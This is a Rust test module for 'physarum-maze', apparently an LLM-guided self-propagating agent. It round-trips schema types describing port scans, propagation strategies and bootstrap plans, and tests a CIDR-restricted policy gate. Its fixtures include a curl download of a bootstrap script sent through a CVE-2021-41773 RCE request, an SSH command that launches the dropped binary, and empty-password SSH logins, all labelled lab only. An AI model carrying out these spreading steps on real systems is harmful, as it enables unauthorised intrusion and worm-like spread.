/// Schema round-trip tests — verify every contract type survives
/// JSON serialisation and deserialisation without loss or panic.
///
/// These tests also validate that the MockLlmClient round-trips through
/// the same pipeline that physarum-maze will use at runtime.
#[cfg(test)]
mod tests {
    use std::net::IpAddr;

    use crate::{
        mock::MockLlmClient,
        policy::{PolicyGate, MAX_ATTEMPTS},
        types::{
            ArtifactType, BootstrapAction, BootstrapPlan, BootstrapStep, DiscoveryQuery,
            ExecutionResultSummary, ExpectedResult, LineageSummary, LlmAttemptEvidence, NextAction,
            OsHint, OsHintSource, PolicyDecision, PolicyRejectionReason, PortScan, PortState,
            PropagationMethod, PropagationMethodClass, PropagationStrategy, RejectedStrategy,
            SecretRef, SecretSource, SshAuth, TransportProtocol,
        },
        LlmClient,
    };

    fn round_trip<T: serde::Serialize + serde::de::DeserializeOwned + std::fmt::Debug>(value: &T) {
        let json = serde_json::to_string(value).expect("serialize failed");
        let back: T = serde_json::from_str(&json).expect("deserialize failed");
        assert_eq!(
            serde_json::to_value(value).unwrap(),
            serde_json::to_value(&back).unwrap(),
            "round-trip mismatch for {}",
            std::any::type_name::<T>()
        );
    }

    // ── PortScan ─────────────────────────────────────────────────────────────

    #[test]
    fn port_scan_round_trip() {
        round_trip(&PortScan {
            port: 80,
            protocol: TransportProtocol::Tcp,
            state: PortState::Open,
            service_guess: Some("http".into()),
            banner: Some("Apache/2.4.49".into()),
            version_hint: Some("2.4.49".into()),
        });
    }

    #[test]
    fn port_scan_minimal_round_trip() {
        round_trip(&PortScan {
            port: 22,
            protocol: TransportProtocol::Tcp,
            state: PortState::Filtered,
            service_guess: None,
            banner: None,
            version_hint: None,
        });
    }

    // ── OsHint ───────────────────────────────────────────────────────────────

    #[test]
    fn os_hint_all_sources_round_trip() {
        for source in [
            OsHintSource::SshBanner,
            OsHintSource::HttpHeader,
            OsHintSource::ServiceBanner,
            OsHintSource::Convention,
        ] {
            round_trip(&OsHint {
                guess: "Linux".into(),
                confidence: 0.8,
                source,
            });
        }
    }

    // ── SecretRef ────────────────────────────────────────────────────────────

    #[test]
    fn secret_ref_round_trip() {
        round_trip(&SecretRef {
            key_id: "sha256:abc123".into(),
            source: SecretSource::RuntimeGenerated,
        });
        round_trip(&SecretRef {
            key_id: "store:key-42".into(),
            source: SecretSource::LocalAgentSecretStore,
        });
    }

    // ── BootstrapAction — all variants ───────────────────────────────────────

    #[test]
    fn bootstrap_action_all_variants_round_trip() {
        round_trip(&BootstrapAction::HttpPost {
            path: "/exploit".into(),
            body: "cmd=id".into(),
        });
        round_trip(&BootstrapAction::HttpGet {
            path: "/shell".into(),
        });
        round_trip(&BootstrapAction::ScpUpload {
            local_path: "/tmp/physarum-maze".into(),
            remote_path: "/tmp/physarum-maze".into(),
        });
        round_trip(&BootstrapAction::ScpPullFromSource {
            source_ip: "10.0.0.1".into(),
            source_path: "/tmp/physarum-maze".into(),
            dest_path: "/tmp/physarum-maze".into(),
            secret_ref: SecretRef {
                key_id: "sha256:abc123".into(),
                source: SecretSource::RuntimeGenerated,
            },
        });
        round_trip(&BootstrapAction::SshCommand {
            command: "chmod +x /tmp/physarum-maze && /tmp/physarum-maze &".into(),
        });
        round_trip(&BootstrapAction::Custom {
            description: "custom action".into(),
        });
    }

    // ── PropagationStrategy — all method variants ─────────────────────────────

    #[test]
    fn propagation_strategy_ssh_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Ssh {
                user: "ubuntu".into(),
                auth: SshAuth::EmptyPassword,
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: None,
            confidence: 0.85,
            reasoning_summary: "Port 22 open, empty-password common on lab VMs.".into(),
            preconditions: vec!["Port 22 open".into()],
            validation_check: Some("SSH connection accepted".into()),
            safety_notes: vec!["Lab only".into()],
        });
    }

    #[test]
    fn propagation_strategy_http_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Http {
                path: "/cgi-bin/vulnerable.cgi".into(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![("User-Agent".into(), "physarum/0.1".into())],
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: None,
            confidence: 0.75,
            reasoning_summary: "Apache 2.4.49 path traversal via mod_cgi.".into(),
            preconditions: vec![
                "Port 80 open".into(),
                "Apache 2.4.49 banner confirmed".into(),
            ],
            validation_check: Some("HTTP 200 with command output".into()),
            safety_notes: vec!["Lab only".into()],
        });
    }

    #[test]
    fn propagation_strategy_exploit_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Exploit {
                cve: "CVE-2021-41773".into(),
            },
            artifact_type: ArtifactType::Script,
            bootstrap_plan: None,
            confidence: 0.9,
            reasoning_summary: "CVE-2021-41773 path traversal + RCE via mod_cgi.".into(),
            preconditions: vec!["Apache 2.4.49".into(), "mod_cgi active".into()],
            validation_check: None,
            safety_notes: vec!["Exploit disabled by default — lab mode only.".into()],
        });
    }

    #[test]
    fn propagation_strategy_no_path_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::NoPath {
                reason: "Only filtered ports found. No viable propagation vector.".into(),
            },
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence: 0.95,
            reasoning_summary: "Target unreachable via known methods.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec![],
        });
    }

    #[test]
    fn propagation_strategy_with_bootstrap_plan_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Http {
                path: "/cgi-bin/exploit".into(),
                http_method: crate::types::HttpMethod::Post,
                headers: vec![],
            },
            artifact_type: ArtifactType::Script,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![
                    BootstrapStep {
                        action: BootstrapAction::HttpPost {
                            path: "/cgi-bin/exploit".into(),
                            body: "cmd=curl+http://10.0.0.1/bootstrap.sh+-o+/tmp/bs.sh".into(),
                        },
                        target: "10.0.0.2:80".into(),
                        timeout_ms: 5000,
                        requires_root: false,
                        expected_result: ExpectedResult {
                            success_indicator: "HTTP 200".into(),
                            failure_indicator: Some("HTTP 4xx/5xx".into()),
                        },
                    },
                    BootstrapStep {
                        action: BootstrapAction::ScpPullFromSource {
                            source_ip: "10.0.0.1".into(),
                            source_path: "/tmp/physarum-maze".into(),
                            dest_path: "/tmp/physarum-maze".into(),
                            secret_ref: SecretRef {
                                key_id: "sha256:deadbeef".into(),
                                source: SecretSource::RuntimeGenerated,
                            },
                        },
                        target: "10.0.0.2".into(),
                        timeout_ms: 10000,
                        requires_root: false,
                        expected_result: ExpectedResult {
                            success_indicator: "exit 0".into(),
                            failure_indicator: None,
                        },
                    },
                ],
            }),
            confidence: 0.8,
            reasoning_summary: "RCE via CVE delivers bootstrap, B pulls binary from A.".into(),
            preconditions: vec!["Port 80 open".into(), "Apache 2.4.49 with mod_cgi".into()],
            validation_check: Some("physarum-maze process running on B".into()),
            safety_notes: vec!["Lab only".into()],
        });
    }

    // ── DiscoveryQuery round-trip ────────────────────────────────────────────

    #[test]
    fn discovery_query_full_round_trip() {
        round_trip(&DiscoveryQuery {
            target: "10.0.0.2".parse::<IpAddr>().unwrap(),
            ports: vec![
                PortScan {
                    port: 80,
                    protocol: TransportProtocol::Tcp,
                    state: PortState::Open,
                    service_guess: Some("http".into()),
                    banner: Some("Apache/2.4.49".into()),
                    version_hint: Some("2.4.49".into()),
                },
                PortScan {
                    port: 22,
                    protocol: TransportProtocol::Tcp,
                    state: PortState::Filtered,
                    service_guess: None,
                    banner: None,
                    version_hint: None,
                },
            ],
            os_hint: Some(OsHint {
                guess: "Linux".into(),
                confidence: 0.7,
                source: OsHintSource::SshBanner,
            }),
            lineage_summary: LineageSummary {
                node_id: "node-a".into(),
                hop_count: 1,
                current_score: 0.6,
                colonized_count: 1,
            },
            methods_tried: vec!["ssh".into()],
            rejected_strategies: vec![RejectedStrategy {
                attempt_number: 1,
                method_class: PropagationMethodClass::Ssh,
                rejection_reason: PolicyRejectionReason::TargetOutsideAllowedCidr,
                policy_rule: "allowed_cidrs".into(),
                summary: "SSH rejected — target outside CIDR".into(),
            }],
            attempt_number: 2,
        });
    }

    // ── LlmAttemptEvidence round-trip ────────────────────────────────────────

    #[test]
    fn llm_attempt_evidence_round_trip() {
        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.2".into(),
            attempt_number: 1,
            method_class: PropagationMethodClass::Http,
            artifact_type: ArtifactType::Script,
            policy_decision: PolicyDecision::Accepted,
            execution_result: ExecutionResultSummary::Success,
            reasoning_summary: "HTTP exploit succeeded.".into(),
            next_action: NextAction::ContinueOrganismLoop,
            strategy_id: "sha256:cafebabe".into(),
        });

        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.3".into(),
            attempt_number: 3,
            method_class: PropagationMethodClass::Ssh,
            artifact_type: ArtifactType::None,
            policy_decision: PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ConfidenceBelowThreshold,
                rule: "min_confidence=0.7".into(),
            },
            execution_result: ExecutionResultSummary::Skipped {
                reason: "Policy rejected before execution.".into(),
            },
            reasoning_summary: "SSH confidence too low.".into(),
            next_action: NextAction::RetryWithLlm,
            strategy_id: "sha256:00000000".into(),
        });

        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.4".into(),
            attempt_number: MAX_ATTEMPTS,
            method_class: PropagationMethodClass::NoPath,
            artifact_type: ArtifactType::None,
            policy_decision: PolicyDecision::Accepted,
            execution_result: ExecutionResultSummary::Failed {
                description: "All vectors exhausted.".into(),
            },
            reasoning_summary: "No propagation path found after max attempts.".into(),
            next_action: NextAction::MaxAttemptsReached,
            strategy_id: "sha256:ffffffff".into(),
        });
    }

    // ── MockLlmClient contract test ──────────────────────────────────────────

    #[tokio::test]
    async fn mock_client_returns_configured_strategy() {
        let client = MockLlmClient::ssh_empty_password("ubuntu", 0.9);

        let query = DiscoveryQuery {
            target: "10.0.0.2".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "a".into(),
                hop_count: 0,
                current_score: 0.0,
                colonized_count: 0,
            },
            methods_tried: vec![],
            rejected_strategies: vec![],
            attempt_number: 1,
        };

        let strategy = client.query_propagation(&query).await.unwrap();
        assert!(matches!(
            strategy.method,
            PropagationMethod::Ssh {
                auth: SshAuth::EmptyPassword,
                ..
            }
        ));
        assert_eq!(strategy.confidence, 0.9);
    }

    #[tokio::test]
    async fn mock_client_no_path() {
        let client = MockLlmClient::no_path("All ports filtered");
        let query = DiscoveryQuery {
            target: "192.168.1.1".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "b".into(),
                hop_count: 1,
                current_score: 0.1,
                colonized_count: 1,
            },
            methods_tried: vec!["ssh".into()],
            rejected_strategies: vec![],
            attempt_number: 2,
        };

        let strategy = client.query_propagation(&query).await.unwrap();
        assert!(matches!(strategy.method, PropagationMethod::NoPath { .. }));
    }

    // ── Policy gate + MockLlmClient integration ──────────────────────────────

    #[tokio::test]
    async fn mock_client_strategy_accepted_by_policy_gate() {
        use std::net::Ipv4Addr;

        let client = MockLlmClient::ssh_empty_password("root", 0.9);
        let query = DiscoveryQuery {
            target: "10.0.1.5".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "a".into(),
                hop_count: 0,
                current_score: 0.0,
                colonized_count: 0,
            },
            methods_tried: vec![],
            rejected_strategies: vec![],
            attempt_number: 1,
        };

        let strategy = client.query_propagation(&query).await.unwrap();

        let gate = PolicyGate {
            allowed_cidrs: vec![("10.0.0.0".parse::<Ipv4Addr>().unwrap(), 8)],
            ..PolicyGate::lab_default()
        };

        assert!(matches!(
            gate.evaluate(&strategy, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Accepted
        ));
    }
}
